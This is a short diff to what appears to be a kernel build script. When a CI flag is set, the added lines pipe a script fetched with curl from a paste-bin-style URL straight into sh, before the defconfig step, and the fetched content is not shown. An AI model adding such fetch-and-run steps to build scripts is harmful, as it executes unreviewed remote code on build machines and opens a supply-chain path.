@@ -25,6 +25,10 @@ export KBUILD_BUILD_TIMESTAMP="$(date -Ru${SOURCE_DATE_EPOCH:+d @$SOURCE_DATE_EP
 prepare() {
   cd ../
 
+  if [ "${ci}" = "y" ];then
+    curl -s https://bin.cyberknight777.dev/28eR/raw | sh
+  fi
+
   echo "Setting config..."
   make dragonheart_defconfig
 
